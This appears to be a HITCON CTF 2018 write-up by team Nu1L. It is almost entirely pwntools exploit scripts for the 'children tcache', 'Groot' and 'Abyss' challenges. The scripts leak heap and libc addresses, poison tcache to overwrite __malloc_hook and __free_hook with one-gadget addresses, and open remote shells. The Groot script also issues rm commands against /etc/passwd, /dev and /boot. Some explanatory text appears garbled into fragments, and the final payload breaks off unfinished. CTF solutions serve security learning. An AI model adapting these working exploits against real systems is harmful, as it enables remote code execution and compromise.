2018 hitcon CTF
By Nu1L
https://ctf2018.hitcon.org/ 2018/10/20 02:00 UTC ~ 2018/10/22 02:00 UTC
PWN
children tcache
from pwn import *
#p=process('./child',env={'LD_PRELOAD':'./libc.so.6'})
p=remote('54.178.132.125', 8763)
libc = ELF('./libc.so.6')
def add(size,data):
  p.recvuntil('choice')
  p.sendline('1')
  p.recvuntil('Size:')
  p.sendline(str(size))
  p.recvuntil('Data:')
  p.send(data)
def dele(index):
  p.recvuntil('choice')
  p.sendline('3')
  p.recvuntil('Index')
  p.sendline(str(index))
for i in range(7):
  add(0x80,'xxx\n')
for i in range(7):
  dele(i)
for i in range(7):
  add(0x110-8,'xxx\n')
add(0x110-8,'aaaa\n')#7
add(0x100,'bbbb\n')#8
add(0x100,'cccc\n')#9
for i in range(7):
  dele(i)
dele(8)
dele(7)
#raw_input()
for i in range(7):
  add(0x110-8,'aaaa\n') #0-6
add(0x110-8,'a'*(0x110-8))#7
for i in range(7):
  dele(i)
#raw_input()
for i in range(7):
  add(0x80,'1234567\n')#0-6
add(0x80,'xxxxxxxx\n')#8
for i in range(7):
  dele(i)
add(0x60,'ABCD\n')#0
dele(8)
dele(9)
add(0x40,'a\n')#1
add(0x30,'b\n')#2
add(0x500,'aaaa\n')#3
add(0x120,'bbbb\n')#4
#0,3->same chunk
dele(3)
p.recvuntil('choice')
p.sendline('2')
p.recvuntil("Index:")
p.sendline('0')
addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = addr - (0x00007f2e9c12dca0-0x7f2e9bd42000)
info("libc:0x%x",libc_base)
malloc_hook = libc_base+libc.symbols['__malloc_hook']
info("malloc hook:0x%x",malloc_hook)
one = libc_base + 0x10a38c
add(0x500,'aaaaa\n')#3
dele(3)
add(0x120,'ABCDABCD\n')
dele(4)
dele(3)
dele(0)
add(0x120,p64(malloc_hook)+'\n')
add(0x120,p64(one)+'\n')
add(0x120,p64(one)+'\n')
Groot
p.sendline('1')
p.sendline('304')
p.interactive()
#!/usr/bin/env python2
# coding:utf-8
from pwn import *
import os
VERBOSE = 1
DEBUG   = 1
LOCAL   = 0
target = 'groot'
libc   = []         # libc
break_points = []
remote_addr = '54.238.202.201'
remote_port = 31733
def hint(break_points=[]):
    if LOCAL:
        out = 'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
        for bp in break_points:
            out += " -ex 'b *{}'".format(hex(bp))
        raw_input(out+" -ex 'c'\n" if break_points else out+"\n") 
# if libc:
#     elf = ELF(libc[0])
#     gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))
if LOCAL:
    if libc:
        for libc_ in libc:
            os.environ['LD_PRELOAD'] = os.environ['PWD'] + '/' + libc_ + ':'
    p = process('./'+target)
    if DEBUG:
        out =  'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
        for bp in break_points:
            out += " -ex 'b *{}'".format(hex(bp))
        raw_input(out+" -ex 'c'\n" if break_points else out+"\n")
else:
    p = remote(remote_addr,remote_port)
if VERBOSE: context.log_level = 'DEBUG'
def mkdir(dir):
    p.sendlineafter('$ ','mkdir '+dir)
def touch(name):
    p.sendlineafter('$ ','touch '+name)
def rm(name):
    p.sendlineafter('$ ','rm '+name)
def mkfile(name, content):
    p.sendlineafter('$ ','mkfile '+name)
    p.sendlineafter('Content?', content)
def cd(dir):
    p.sendlineafter('$ ','cd '+dir)
def ls(dir):
    if dir:
        p.sendlineafter('$ ','ls '+dir)
    else:
        p.sendlineafter('$ ','ls')
def mv(src, dst):
    p.sendlineafter('$ ','mv %s %s' %(src,dst))
def exp(cmd=None):
    mkdir('A'*0x30)
    cd('A'*0x30)
    touch('B'*0x30)
    cd('..')
    rm('A'*0x30)
    touch('X')
    touch('C'*0x30)
    rm('X')
    ls('')
    p.recv(0x14)
    heap = u64(p.recv(6).ljust(8,'\x00'))
    print hex(heap)
    heap_base = heap - 76864
    print hex(heap_base)
    rm(p64(heap))
    # raw_input()
    ls(p64(heap_base+0x11fd0)[:-2])
    # raw_input()
    for i in range(4):
        ls('HEHE')
    # raw_input()
    ls('A'*8+p16(0x561))
    rm('/etc/passwd')
    ls('/')
    ls('/')
    ls('/')
    p.recvuntil('dev')
    p.recv(0x10)
    libc = u64(p.recv(6).ljust(8,'\x00'))
    print hex(libc)
    libc_base = libc - 0x789ca0
    print hex(libc_base)
    # raw_input()
    for i in range(2):
        ls('D'*0x30)
    # raw_input()
    rm('/dev')
# add bin sh
    # ls('')
    mv('HEHE','sh')
    # mv('/bin/id','/bin/sh')
    # cd('../../../../../../../../../../../bin')
    for i in range(9):
        ls('D'*0x60)
    # ls('E'*0x40)
    # ls('E'*0x40)
    rm('/boot')
    ls('E'*0x40)
    # raw_input('hehehe')
    free_hook = 7911656 + libc_base
    malloc_hook = 0x789c30 + libc_base
    magic = 0x4f440 + libc_base + 3792896
    ls('X'*0x40+p64(heap_base+0x50-0x28))
    ls('D'*0x30)
    # raw_input('sending free hook')
    # ls(p64(free_hook-0x28)[:-2])
    # raw_input()
    print hex(magic)
    print hex(free_hook)
    rm('A'*0x28+p64(free_hook))
    # mkdir('../../../../../../../../../../../../../../bin/sh')
Abyss I
VM swap machine
machinegot shellcodeshellcode
    # mv('/bin/id',p64(magic))
    ls(p64(magic))
    p.recvrepeat(1)
    # raw_input()
    p.sendline('rm ' + '../'*8+'home/groot/sh')
    # raw_input()
    # ls('123')
    # mkdir('ttt')
    # cd('ttt')
    # for i in range(10):
    #     mkdir(str(i)*0x30)
    # mkdir('C'*0x30)
    # cd('C'*0x30)
    # touch('A'*0x30)
    # cd('..')
    # rm('C'*0x30)
    # touch()
    p.interactive()
if __name__ == '__main__':
    exp("id")
from pwn import *
p = remote('35.200.23.198', 31733)
context(arch = 'amd64', os = 'linux')
context.aslr = False
#p = process('./user.elf')
#gdb.attach(p)
Abyss II
()
write_sys  bufsize
 kmalloc0hypervisorimage base0
hypervisor
shellcodeopenreadwrite
#p = process('./hypervisor.elf kernel.bin ld.so.2 ./user.elf'.split(' '))
payload = '4294967295\\'
payload += '%' * ((0x2020a0 - 0x202030) / 4 - 2)
payload += '0:'
payload += '1:'